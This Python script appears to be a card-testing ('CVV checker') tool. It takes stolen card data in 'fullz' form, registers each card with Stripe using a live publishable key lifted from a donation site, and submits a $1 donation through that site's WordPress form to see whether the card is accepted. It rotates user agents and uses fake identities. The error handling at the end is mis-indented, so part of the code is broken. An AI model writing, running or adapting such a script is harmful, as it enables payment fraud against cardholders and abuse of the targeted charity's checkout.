import asyncio
import base64
import random
from fake_useragent import UserAgent
import requests
from FUNC.defs import *
import re
from bs4 import BeautifulSoup
from FUNC.defs import *

# import requests


def gets(s, start, end):
            try:
                start_index = s.index(start) + len(start)
                end_index = s.index(end, start_index)
                return s[start_index:end_index]
            except ValueError:
                return None




async def create_cvv_charge(fullz , session):
    try:
        cc , mes , ano , cvv = fullz.split("|")
        user_agent          = UserAgent().random
        random_data         = await get_random_info(session)
        fname               = random_data["fname"]
        lname               = random_data["lname"]
        email               = random_data["email"]



        data={
        'type':'card',
        'card[number]':cc,
        'card[cvc]':cvv,
        'card[exp_month]':mes,
        'card[exp_year]':ano,
        'guid':'8767fe05-30b7-4a3e-b5be-3952943deba3d9e5e9',
        'muid':'06cd1deb-58df-484a-96b1-9ff05fa13a21d3456a',
        'sid':'170d3d01-0f16-4509-a427-a79a95cff0433e2fb0',
        'pasted_fields':'number',
        'payment_user_agent':'stripe.js/2F7b2f7dbc1b; stripe-js-v3/2F7b2f7dbc1b; card-element',
        'referrer':'https://lumivoce.org',
        'time_on_page':'27287',
        'key':'pk_live_519sODGHwVm9HtpVbGWn3R5HrSXBaErzDUXPjtr2JvODEXgSV8x7UQnU3fChIZ6hlwrgM4ubVpp1DFbUDX74ft4pV00GlpMnrpR',
        }
        response = await session.post('https://api.stripe.com/v1/payment_methods', data=data)


        try:
            id=response.json()['id']
            # print(id)
        except:
            return response.text
        

        params = {
            't': '1740664323418',
        }

        files = {
            'action': (None, 'fluentform_submit'),
            'data': (None, f'choose_time=One%20Time%20&payment_input=Other%20Amount&custom-payment-amount=1&input_text=Crish%20Niki&email=bob.redrat27@gmail.com&payment_method=stripe&__fluent_form_embded_post_id=263&_fluentform_49_fluentformnonce=2383036afb&_wp_http_referer=%2Fdonate%2F&__stripe_payment_method_id={id}&isFFConversational=true'),
            'form_id': (None, '49'),
        }

        response = await session.post(
            'https://lumivoce.org/wp-admin/admin-ajax.php',
            params=params,
            files=files,
        )

        # print(response.text)

        response =response.text
        await asyncio.sleep(0.5)
        return response

    except Exception as e:
       try:
        return r(e)
    except:
        return str(e)
